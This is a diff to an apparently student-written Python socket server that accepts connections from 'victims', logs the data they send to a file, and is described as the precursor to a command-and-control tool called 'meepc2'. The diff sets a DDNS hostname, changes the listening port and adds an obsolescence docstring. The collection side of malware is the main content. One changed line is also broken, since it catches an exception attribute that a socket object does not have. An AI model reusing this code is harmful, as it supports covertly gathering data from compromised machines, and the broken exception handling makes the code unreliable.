@@ -1,3 +1,10 @@
+"""
+Obsolete program
+Use meepc2 instead
+
+This was the pre-cursor to meepc2
+"""
+
 import socket
 import _thread
 
@@ -18,7 +25,7 @@ def handler(handler_socket, addr):
                 if temp == "":
                     break
                 file.write(str(temp))
-        except socket.error:
+        except handler_socket.error:
             print("\nERROR\nClosing connection to victim: " + str(addr))
             handler_socket.close()
     print("Victim disconnected: " + str(addr))
@@ -29,10 +36,11 @@ def handler(handler_socket, addr):
 def main():
     # create socket, set hostname (& convert to ip) and port
     s = socket.socket()
-    # add your hostname
-    hostname = ""
+    hostname = "{ddns}.student.rit.edu"
     ip = socket.gethostbyname(hostname)
-    port = 31337
+    # the 'meep' port
+    # m = 13, e = 3 + 3 = 6, p = 16
+    port = 13616
 
     # bind to port and listen
     s.bind((ip, port))
